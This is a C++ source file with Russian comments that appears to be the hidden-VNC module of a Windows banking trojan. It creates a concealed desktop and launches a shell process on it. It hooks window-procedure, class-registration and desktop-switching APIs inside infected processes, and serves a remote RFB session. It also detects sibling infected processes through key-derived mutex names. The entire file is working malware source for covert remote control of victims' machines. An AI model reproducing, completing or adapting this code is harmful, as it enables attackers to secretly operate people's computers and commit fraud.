#include <windows.h>
#include <shlobj.h>
#include <ws2tcpip.h>
#include <wininet.h>

#include "..\defines.h"
#include "..\core.h"
#include "..\corehook.h"
#include "..\cryptedstrings.h"
#include "..\windowstation.h"

#include "rfb.h"
#include "vncserver.h"
#include "defines.h"

#include "..\..\common\mem.h"
#include "..\..\common\str.h"
#include "..\..\common\debug.h"
#include "..\..\common\gdi.h"
#include "..\..\common\process.h"
#include "..\..\common\sync.h"
#include "..\..\common\fs.h"

/*
  ИЗВЕСТНЫЕ ПРОБЛЕМЫ:
  1. Z-нижнее окно должно прорисовываться поверх z-верхнего окна (пример, NSIS 2.x).
     Проблему решить можно, но будет затрачено много CPU. Я так понел, когда прорисовывается верхнее
     окно, система сразу после него, отправляет прорисовку окнам, которые оно перекрывает...
  
  2. Также не обрабатываются clipping-регионы, т.к. это дополнительный расход CPU.

  3. Фоновое окно InstallShield порисовывается, хотя оно как-то хитро скрыто... (пример, установщик ICQ7)

  4. Естественно не рисуются крутые окна типа WinAmp, некторые глючат (ICQ7).

  5. В посьянсе свободная ячейка, в WM_PAINT рисует в неклинетскую область, оюдмуать ка крешить эту проблему.
  
  FIXME:
    Изменение разрещения и палитры.
    Блокировать звук.
    Dead chars
  
*/
#if(BO_VNC > 0)

VNCPROCESSDATA vncActiveProcessData; //Заполнена только при (coreData.proccessFlags & Core::CDPF_VNC_ACTIVE).

////////////////////////////////////////////////////////////////////////////////////////////////////
// Подстройки под оконные классы.
////////////////////////////////////////////////////////////////////////////////////////////////////

const static struct {LPWSTR windowClass; int windowClassLenght; WORD method;} winowPrintTypes[] =
{
  /*
    Тень окна. Она не нужна.
  */
  {L"SysShadow",           9, WCF_PAINTMETHOD_NOP},                                     
  
  /*
    Меню, не удалось установить перехват, видемо в результате оптимизации, вызывается что-то
    внутреннее.

    Также по неизвестной причине, все сообшения мыши для HTCLIENT идут с координатами отностиельно
    экрана.
  */
  {L"#32768",              6, WCF_PAINTMETHOD_PRINTWINDOW | WCF_MOUSE_CLIENT_TO_SCREEN | WCF_MOUSE_AUTOCAPTURE},
  
  /*
    Коносльное окно, создается сервисом.
  */
  {L"ConsoleWindowClass", 18, WCF_PAINTMETHOD_PRINTWINDOW | WCF_PAINTMETHOD_SKIP_HOOK},

  /*
    Языковая панель. Причина проблемы не известна.
  */
  {L"CiceroUIWndFrame",   16, WCF_PAINTMETHOD_PRINTWINDOW | WCF_PAINTMETHOD_SKIP_HOOK},

  /*
    MDIClient. Причина проблемы не известна.
  */
  {L"MDIClient",           9, WCF_PAINTMETHOD_PRINTWINDOW | WCF_PAINTMETHOD_SKIP_HOOK},

  /*
    Вылетает в Seven. Причина проблемы не известна.
  */
  {L"SysListView32",      13, WCF_PAINTMETHOD_PRINT},
};

WORD getWindowClassFlags(HWND window)
{
  WCHAR className[256 + 1]; //The maximum length for lpszClassName is 256.
  int classNameLen = CWA(user32, GetClassNameW)(window, className, sizeof(className) / sizeof(WCHAR));

  if(classNameLen > 0)for(DWORD i = 0; i < sizeof(winowPrintTypes) / sizeof(winowPrintTypes[0]); i++)
  {
    //FIXME: сравнивать без учета регистра.
    if(Str::_CompareW(className, winowPrintTypes[i].windowClass, classNameLen, winowPrintTypes[i].windowClassLenght) == 0)
    {
      return winowPrintTypes[i].method;
    }
  }
  return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Утилиты.
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Инициализация vncProcessData. freeVncProcessData() должна быть вызвона в не зависимости от Return.

  OUT vncProcessData - VNCPROCESSDATA.
  IN isServer        - создавать серверные объекты.
  
  Return             - true - в случи успеха,
                       false - в случаи проблемы.
*/
static bool createVncProcessData(VNCPROCESSDATA *vncProcessData, bool isServer)
{
  WCHAR name[50];

  Mem::_zero(vncProcessData, sizeof(VNCPROCESSDATA));
  
  //TLS.
  if((vncProcessData->tlsPaintIndex = CWA(kernel32, TlsAlloc)()) == TLS_OUT_OF_INDEXES)return false;

  //Сообшение рисования.
  Core::generateObjectName(Core::OBJECT_ID_VNC_MESSAGE, name, MalwareTools::KON_DEFAULT);
  if((vncProcessData->vncMessage = CWA(user32, RegisterWindowMessageW)(name)) == 0)return false;
  
  //Событие vncMessage.
  Core::generateObjectName(Core::OBJECT_ID_VNC_EVENT, name, MalwareTools::KON_SESSION);
  if((vncProcessData->vncMessageEvent = CWA(user32, CreateEventW)(&coreData.securityAttributes.saAllowAll, TRUE, FALSE, name)) == NULL)return false;
  
  //Глобальные данные.
  {
    Core::generateObjectName(Core::OBJECT_ID_VNC_GLOBALDATA_MUTEX, name, MalwareTools::KON_SESSION);
    if((vncProcessData->globalDataMutex = CWA(kernel32, CreateMutexW)(&coreData.securityAttributes.saAllowAll, FALSE, name)) == NULL)return false;

    Core::generateObjectName(Core::OBJECT_ID_VNC_MAPFILE, name, MalwareTools::KON_SESSION);
    if((vncProcessData->mapFileHandle = CWA(kernel32, CreateFileMappingW)(NULL, &coreData.securityAttributes.saAllowAll, PAGE_READWRITE, 0, sizeof(VNCGLOBALDATA) + MAX_BITMAP_SIZE, name)) == NULL)return false;
    
    void *p = CWA(kernel32, MapViewOfFile)(vncProcessData->mapFileHandle, FILE_MAP_WRITE, 0, 0, 0);
    if(p == NULL)return false;

    vncProcessData->globalData  = (VNCGLOBALDATA *)p;
    vncProcessData->dib.desktop = (LPBYTE)p + sizeof(VNCGLOBALDATA);
  }

  bool retVal = false;

  //DIB
  {
    HDC screenDc = CWA(user32, GetDC)(NULL);
    if(screenDc != NULL)
    {
      vncProcessData->dib.rect.left   = 0;
      vncProcessData->dib.rect.top    = 0;
      vncProcessData->dib.rect.right  = CWA(gdi32, GetDeviceCaps)(screenDc, HORZRES);
      vncProcessData->dib.rect.bottom = CWA(gdi32, GetDeviceCaps)(screenDc, VERTRES);

      BITMAPINFO *bitmapInfo;
      vncProcessData->dib.tempHandle = Gdi::_createDibSection(screenDc, vncProcessData->dib.rect.right, vncProcessData->dib.rect.bottom, &bitmapInfo, (void **)&vncProcessData->dib.temp, NULL, 0);
      CWA(user32, ReleaseDC)(NULL, screenDc);

      if(vncProcessData->dib.tempHandle != NULL)
      {
        //Вычисляем различные переменные.
        vncProcessData->dib.pixelSize    = bitmapInfo->bmiHeader.biBitCount / 8;
        vncProcessData->dib.widthInBytes = vncProcessData->dib.rect.right * vncProcessData->dib.pixelSize;
        vncProcessData->dib.widthInBytes = ALIGN_UP(vncProcessData->dib.widthInBytes, sizeof(DWORD));

        Mem::free(bitmapInfo);
        retVal = true;
      }
    }      
  }

  //Серверная часть.
  if(retVal == true && isServer == true)
  {
    retVal = false;
        
    //Данные необходимые для обнаружения зараженных процессов.
    {
      BASECONFIG baseConfig;
      PESETTINGS pes;
      
      Core::getBaseConfig(&baseConfig);
      Core::getPeSettings(&pes);

      Mem::_copy(&vncProcessData->serverData.processDetectionData.osGuid, &coreData.osGuid, sizeof(GUID));
      vncProcessData->serverData.processDetectionData.processInfecionId = pes.processInfecionId;
      Mem::_copy(&vncProcessData->serverData.processDetectionData.baseKey, &baseConfig.baseKey, sizeof(Crypt::RC4KEY));
    }

    //Мютекс рисования.
    Core::generateObjectName(Core::OBJECT_ID_VNC_PAINT_MUTEX, name, MalwareTools::KON_SESSION);
    if((vncProcessData->serverData.dcData.paintMutex = CWA(kernel32, CreateMutexW)(&coreData.securityAttributes.saAllowAll, FALSE, name)) == NULL)return false;
    
    //DC.
    HDC desktopDc = CWA(user32, GetDC)(NULL);
    if(desktopDc != NULL)
    {
      if((vncProcessData->serverData.dcData.dc            = CWA(gdi32, CreateCompatibleDC)(desktopDc)) != NULL &&
         (vncProcessData->serverData.dcData.sampleBitmap  = CWA(gdi32, CreateCompatibleBitmap)(desktopDc, 1, 1)) != NULL &&
         (vncProcessData->serverData.dcData.orginalBitmap = (HBITMAP)CWA(gdi32, SelectObject)(vncProcessData->serverData.dcData.dc, vncProcessData->serverData.dcData.sampleBitmap)) != NULL
        )retVal = true;
      CWA(user32, ReleaseDC)(NULL, desktopDc);
    }  
  }
  
  return retVal;
}

/*
  Освобождение vncProcessData.

  OUT vncProcessData - VNCPROCESSDATA.
  IN isServer        - освобождать серверные объекты.
*/
static void freeVncProcessData(VNCPROCESSDATA *vncProcessData, bool isServer)
{
  if(vncProcessData->dib.tempHandle != NULL)CWA(gdi32, DeleteObject)(vncProcessData->dib.tempHandle);

  if(vncProcessData->vncMessageEvent != NULL)CWA(kernel32, CloseHandle)(vncProcessData->vncMessageEvent);
  if(vncProcessData->tlsPaintIndex != TLS_OUT_OF_INDEXES)CWA(kernel32, TlsFree)(vncProcessData->tlsPaintIndex);

  if(vncProcessData->globalDataMutex != NULL)CWA(kernel32, CloseHandle)(vncProcessData->globalDataMutex);
  if(vncProcessData->globalData != NULL)CWA(kernel32, UnmapViewOfFile)(vncProcessData->globalData);
  if(vncProcessData->mapFileHandle != NULL)CWA(kernel32, CloseHandle)(vncProcessData->mapFileHandle);

  if(isServer)
  {
    if(vncProcessData->serverData.dcData.orginalBitmap != NULL)CWA(gdi32, SelectObject)(vncProcessData->serverData.dcData.dc, vncProcessData->serverData.dcData.orginalBitmap);
    if(vncProcessData->serverData.dcData.sampleBitmap != NULL)CWA(gdi32, DeleteObject)(vncProcessData->serverData.dcData.sampleBitmap);
    if(vncProcessData->serverData.dcData.dc != NULL)CWA(gdi32, DeleteDC)(vncProcessData->serverData.dcData.dc);
    if(vncProcessData->serverData.dcData.paintMutex != NULL)CWA(kernel32, CloseHandle)(vncProcessData->serverData.dcData.paintMutex);

    //Закрываем дочерный процесс.
    if(vncProcessData->serverData.paintProcess.hThread != NULL && CWA(kernel32, WaitForSingleObject)(vncProcessData->serverData.paintProcess.hThread, 0) != WAIT_TIMEOUT)
    {
      CWA(user32, PostThreadMessageW)(vncProcessData->serverData.paintProcess.dwThreadId, WM_QUIT, 0, 0);
      //CWA(kernel32, TerminateProcess)(vncProcessData->serverData.paintProcess.hProcess, 0);
    }
    Process::_closeProcessInformation(&vncProcessData->serverData.paintProcess);
  }
}

WORD updateInputState(VNCPROCESSDATA *vncProcessData, BYTE virtualKey, bool down)
{
  BYTE *p = vncProcessData->globalData->keysState;
  if(virtualKey != 0)
  {
    p[virtualKey] = down ? 0x80 : 0;

    switch(virtualKey)
    {
      case VK_LSHIFT:
      case VK_RSHIFT:
        p[VK_SHIFT] = (p[VK_LSHIFT] & 0x80 || p[VK_RSHIFT] & 0x80) ? 0x80 : 0;
        break;

      case VK_LCONTROL:
      case VK_RCONTROL:
        p[VK_CONTROL] = (p[VK_LCONTROL] & 0x80 || p[VK_RCONTROL] & 0x80) ? 0x80 : 0;
        break;

      case VK_LMENU:
      case VK_RMENU:
        p[VK_MENU] = (p[VK_LMENU] & 0x80 || p[VK_RMENU] & 0x80) ? 0x80 : 0;
        break;
    }
  }

  //CWA(user32, SetKeyboardState)(p); //Нет смысла.

  WORD mouseState = 0;

  if(p[VK_LBUTTON] & 0x80)mouseState |= MK_LBUTTON;
  if(p[VK_RBUTTON] & 0x80)mouseState |= MK_RBUTTON;
  if(p[VK_MBUTTON] & 0x80)mouseState |= MK_MBUTTON;
  if(p[VK_SHIFT]   & 0x80)mouseState |= MK_SHIFT;
  if(p[VK_CONTROL] & 0x80)mouseState |= MK_CONTROL;

  return mouseState;
}

bool isWindowInfected(VNCPROCESSDATA *vncProcessData, HWND window)
{
  DWORD pid;
  if(CWA(user32, GetWindowThreadProcessId)(window, &pid) > 0)
  {
    //Копия Core::createMutexOfProcess().
    WCHAR objectName[50];
    MalwareTools::_generateKernelObjectName(&vncProcessData->serverData.processDetectionData.osGuid,
                                            vncProcessData->serverData.processDetectionData.processInfecionId,
                                            pid,
                                            objectName,
                                            &vncProcessData->serverData.processDetectionData.baseKey,
                                            MalwareTools::KON_GLOBAL);
    return Sync::_mutexExists(objectName);
  }
  return false;
}

////////////////////////////////////////////////////////////////////////////////////////////////////

void VncServer::init(void)
{
  HDESK desktop = CWA(user32, GetThreadDesktop)(CWA(kernel32, GetCurrentThreadId)());
  if(desktop != NULL)
  {
    WCHAR currentName[50];
    DWORD needed;

    if(CWA(user32, GetUserObjectInformationW)(desktop, UOI_NAME, currentName, sizeof(currentName), &needed) != FALSE && needed == (38 + 1) * sizeof(WCHAR))
    {
      WCHAR vncDesktop[50];
      Core::generateObjectName(Core::OBJECT_ID_VNC_DESKTOP, vncDesktop, MalwareTools::KON_DEFAULT);
      if(Mem::_compare(currentName, vncDesktop, 38 * sizeof(WCHAR)) == 0)
      {
        if(createVncProcessData(&vncActiveProcessData, false))
        {
          coreData.proccessFlags |= Core::CDPF_VNC_ACTIVE;
          WDEBUG0(WDDT_INFO, "Started as VNC-client process");
        }
        else
        {
          freeVncProcessData(&vncActiveProcessData, false);
          WDEBUG0(WDDT_ERROR, "createVncProcessData() failed.");
        }
      }
    }
  }
}

void VncServer::uninit(void)
{ 
  if(coreData.proccessFlags & Core::CDPF_VNC_ACTIVE)freeVncProcessData(&vncActiveProcessData, false);
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Сервер.
////////////////////////////////////////////////////////////////////////////////////////////////////

static void onSecurityType(void *param, LPDWORD securityType, LPSTR *errorMessage)
{

}

static bool onClientInit(void *param, BYTE shared)
{
  return true;
}

static HDC onServerInit(void *param, LPSTR *name, POINT *size)
{
  VNCPROCESSDATA *vncProcessData = (VNCPROCESSDATA *)param;

  *name = "FIXME";

  size->x = vncProcessData->dib.rect.right - vncProcessData->dib.rect.left;
  size->y = vncProcessData->dib.rect.bottom - vncProcessData->dib.rect.top;

  return vncProcessData->serverData.dcData.dc;
}

static void onUpdateDс(void *param)
{
  VNCPROCESSDATA *vncProcessData = (VNCPROCESSDATA *)param;
  paintDesktop(vncProcessData);
}

static void onKeyEvent(void *param, DWORD keySym, bool down)
{
  VNCPROCESSDATA *vncProcessData = (VNCPROCESSDATA *)param;
  keyboardMessage(vncProcessData, keySym, down);
}

static void onPointerEvent(void *param, DWORD flags, LONG x, LONG y, DWORD data)
{
  VNCPROCESSDATA *vncProcessData = (VNCPROCESSDATA *)param;
  mouseMessage(vncProcessData, flags, x, y, data);
}

void onClientCutText(void *param, DWORD len, LPSTR string)
{

}

bool VncServer::start(SOCKET s)
{
  CWA(kernel32, SetThreadPriority)(CWA(kernel32, GetCurrentThread)(), THREAD_PRIORITY_ABOVE_NORMAL);
  
  //Создаем/подключаемся к десктопу.
  WCHAR vncDesktop[50];  
  Core::generateObjectName(Core::OBJECT_ID_VNC_DESKTOP, vncDesktop, MalwareTools::KON_DEFAULT);
  if(!WindowStation::_setThreadDesktopEx(NULL, vncDesktop))
  {
    WDEBUG0(WDDT_ERROR, "WindowStation::_SetThreadDesktopEx() failed.");
    return false;
  }

  //Инициализация данных.
  VNCPROCESSDATA vncProcessData; //Для каждой сессии создаем отельную структуру.
  if(!createVncProcessData(&vncProcessData, true))
  {
    WDEBUG0(WDDT_ERROR, "createVncProcessData() failed.");
    freeVncProcessData(&vncProcessData, true);
    return false;
  }

  bool retVal = (CWA(kernel32, GetShellWindow)() != NULL);

  //Создаем "root" процесс.
  if(retVal == false)
  {
    WCHAR rootModule[MAX_PATH];
    CSTR_GETW(rootBaseName, vnc_rootprocess);

    if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_SYSTEM, NULL, SHGFP_TYPE_CURRENT, rootModule) == S_OK && Fs::_pathCombine(rootModule, rootModule, rootBaseName))
    {
      PROCESS_INFORMATION processInfo;
      STARTUPINFOW startupInfo;
      Mem::_zero(&startupInfo, sizeof(STARTUPINFOW));
      startupInfo.cb          = sizeof(STARTUPINFOW);
      startupInfo.lpDesktop   = vncDesktop;

      if(Process::_createEx(rootModule, NULL, NULL, &startupInfo, &processInfo))
      {
        WDEBUG1(WDDT_INFO, "Root process created, pid=%u.", processInfo.dwProcessId);

        CWA(kernel32, WaitForSingleObject)(processInfo.hProcess, 5000);//Немного подождем пока все загрузится.
        CWA(kernel32, CloseHandle)(processInfo.hThread);
        CWA(kernel32, CloseHandle)(processInfo.hProcess);
        retVal = true;
      }
    }
  }

  //Изменяем некотрые системные параметры.
  {
    //Отключаем анимацию меню.
    CWA(user32, SystemParametersInfoW)(SPI_SETMENUANIMATION, 0, (void *)FALSE, 0);
    //SPI_SETMOUSECLICKLOCK и т.д.
  }  
  
  //Запускаем сессию.
  if(retVal == true)
  {
    Rfb::SERVER_CALLBACKS sc;

    sc.param             = &vncProcessData;
    sc.onSecurityType    = onSecurityType;
    sc.onClientInit      = onClientInit;
    sc.onServerInit      = onServerInit;
    sc.OnUpdateDC        = onUpdateDс;
    sc.onKeyEvent        = onKeyEvent;
    sc.OnPointerEvent    = onPointerEvent;
    sc.OnClientCutText   = onClientCutText;

    Rfb::_ServerThread(s, 30 * 60 * 1000, &sc, vncProcessData.mapFileHandle, sizeof(VNCGLOBALDATA), vncProcessData.serverData.dcData.paintMutex, 300);
  }

  //Освобождаем ресурсы.
  freeVncProcessData(&vncProcessData, true);
  return retVal;
}

/*
  Обработка VNC-сообщения.().
*/
static LRESULT vncMessage(HWND window, WPARAM wParam, LPARAM lParam)
{
  switch(wParam)
  {
    //Хак меню окна.
    case VMW_EXECUTE_MENU:
    case VMW_HILITE_MENU:
    {
      HMENU menu = CWA(user32, GetMenu)(window);
      if(menu == NULL)
      {
        WDEBUG0(WDDT_ERROR, "GetMenu() failed!");
        break;
      }
      
      //Снимаем подсветку со всех пункутов.
      int lastHiliteItem = -1;
      int itemsCount = CWA(user32, GetMenuItemCount)(menu);
      for(int i = 0; i < itemsCount; i++)if(CWA(user32, GetMenuState)(menu, i, MF_BYPOSITION) & MF_HILITE)
      {
        CWA(user32, HiliteMenuItem)(window, menu, i, MF_BYPOSITION | MF_UNHILITE);
        lastHiliteItem = i;
      }

      //Получаем элемент.
      int item = CWA(user32, MenuItemFromPoint)(window, menu, vncActiveProcessData.globalData->cursorPoint);
      if(item == -1)break;

      DWORD itemState = CWA(user32, GetMenuState)(menu, item, MF_BYPOSITION);
      if(lastHiliteItem != item)CWA(user32, EndMenu)();
      CWA(user32, HiliteMenuItem)(window, menu, item, MF_BYPOSITION | MF_HILITE);

      if(wParam == VMW_HILITE_MENU || itemState & (MF_DISABLED | MF_GRAYED))break;
      
      //Запуск подменю.
      if(itemState & MF_POPUP)
      {
        HMENU popupMenu = CWA(user32, GetSubMenu)(menu, item);
        RECT itemRect;
        if(popupMenu != NULL && CWA(user32, GetMenuItemRect)(window, menu, item, &itemRect) != FALSE)
        {
          CWA(user32, TrackPopupMenuEx)(popupMenu, TPM_LEFTALIGN | TPM_TOPALIGN | TPM_LEFTBUTTON | TPM_NOANIMATION | TPM_HORIZONTAL, itemRect.left, itemRect.bottom, window, NULL);
        }
      }
      //Исполнение пункта.
      else
      {
        UINT id = itemState & MF_SEPARATOR ? 0 : CWA(user32, GetMenuItemID)(menu, item);
        if(id != (UINT)-1)CWA(user32, SendMessageW)(window, WM_COMMAND, MAKEWPARAM(id, 0), 0);
      }      
      break;
    }

    //Обновление состояния клавиш.
    case VMW_UPDATE_KEYSTATE:
      CWA(user32, SetKeyboardState)(vncActiveProcessData.globalData->keysState);
      break;
    
    //Рисование.
    default:
    {
      RECT visibleRect;
      visibleRect.left   = LOWORD(wParam);
      visibleRect.top    = HIWORD(wParam);
      visibleRect.right  = LOWORD(lParam);
      visibleRect.bottom = HIWORD(lParam);

      paintWindow(&vncActiveProcessData, window, &visibleRect, false);
    }
  }
  
  CWA(kernel32, SetEvent)(vncActiveProcessData.vncMessageEvent);
  return 0;
}


HDESK WINAPI VncServer::hookerOpenInputDesktop(DWORD flags, BOOL inherit, ACCESS_MASK desiredAccess)
{
  if(IS_VNC_PROCESS)
  {
    WCHAR name[50];
    Core::generateObjectName(Core::OBJECT_ID_VNC_DESKTOP, name, MalwareTools::KON_DEFAULT);
    return CWA(user32, OpenDesktopW)(name, flags, inherit, desiredAccess);
  }

  return CWA(user32, OpenInputDesktop)(flags, inherit, desiredAccess);
}

BOOL WINAPI VncServer::hookerSwitchDesktop(HDESK desktop)
{
  if(IS_VNC_PROCESS)return TRUE;
  return CWA(user32, SwitchDesktop)(desktop);
}

//Пролог для Def*Proc.
#define DEFPROC_PROLOG(window) {if(IS_VNC_PROCESS && msg == vncActiveProcessData.vncMessage)return vncMessage(window, wParam, lParam);}

LRESULT WINAPI VncServer::hookerDefWindowProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, DefWindowProcW)(window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefWindowProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, DefWindowProcA)(window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefDlgProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, DefDlgProcW)(window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefDlgProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, DefDlgProcA)(window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefFrameProcW(HWND frame, HWND client, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(frame);
  return CWA(user32, DefFrameProcW)(frame, client, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefFrameProcA(HWND frame, HWND client, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(frame);
  return CWA(user32, DefFrameProcA)(frame, client, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefMDIChildProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, DefMDIChildProcW)(window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerDefMDIChildProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, DefMDIChildProcA)(window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerCallWindowProcW(WNDPROC prevWndFunc, HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, CallWindowProcW)(prevWndFunc, window, msg, wParam, lParam);
}

LRESULT WINAPI VncServer::hookerCallWindowProcA(WNDPROC prevWndFunc, HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
  DEFPROC_PROLOG(window);
  return CWA(user32, CallWindowProcA)(prevWndFunc, window, msg, wParam, lParam);
}

/*
  Замена Def*Proc на хук.

  IN p   - адрес для проверки.

  Return - адрес хука -  если хук найден. NULL - хук не найден.
*/
static void *replaceDefProc(void *p)
{
  if(p == CWA(user32, DefWindowProcW))return VncServer::hookerDefWindowProcW;
  if(p == CWA(user32, DefWindowProcA))return VncServer::hookerDefWindowProcA;
  
  //За эти функции не уверен.
  if(p == CWA(user32, DefMDIChildProcW))return VncServer::hookerDefMDIChildProcW;
  if(p == CWA(user32, DefMDIChildProcA))return VncServer::hookerDefMDIChildProcA;

  return NULL;
}

#define REGISTERCLASS(type)\
{\
  if(IS_VNC_PROCESS)\
  {\
    void *p;\
    if(wndClass != NULL && (p = replaceDefProc(wndClass->lpfnWndProc)) != NULL)\
    {\
      WNDCLASS##type newClass;\
      Mem::_copy(&newClass, wndClass, sizeof(WNDCLASS##type));\
      newClass.lpfnWndProc = (WNDPROC)p;\
      return CWA(user32, RegisterClass##type)(&newClass);\
    }\
  }\
  return CWA(user32, RegisterClass##type)(wndClass);\
}

ATOM WINAPI VncServer::hookerRegisterClassW(WNDCLASSW *wndClass)
{
  REGISTERCLASS(W);
}

ATOM WINAPI VncServer::hookerRegisterClassA(WNDCLASSA *wndClass)
{
  REGISTERCLASS(A);
}
#undef REGISTERCLASS

#define REGISTERCLASSEX(type)\
{\
  if(IS_VNC_PROCESS)\
  {\
    void *p;\
    if(wndClass != NULL && wndClass->cbSize == sizeof(WNDCLASSEX##type) && (p = replaceDefProc(wndClass->lpfnWndProc)) != NULL)\
    {\
      WNDCLASSEX##type newClass;\
      Mem::_copy(&newClass, wndClass, sizeof(WNDCLASSEX##type));\
      newClass.lpfnWndProc = (WNDPROC)p;\
      return CWA(user32, RegisterClassEx##type)(&newClass);\
    }\
  }\
  return CWA(user32, RegisterClassEx##type)(wndClass);\
}

ATOM WINAPI VncServer::hookerRegisterClassExW(WNDCLASSEXW *wndClass)
{
  REGISTERCLASSEX(W);
}

ATOM WINAPI VncServer::hookerRegisterClassExA(WNDCLASSEXA *wndClass)
{
  REGISTERCLASSEX(A);
}
#undef REGISTERCLASSEX

#endif
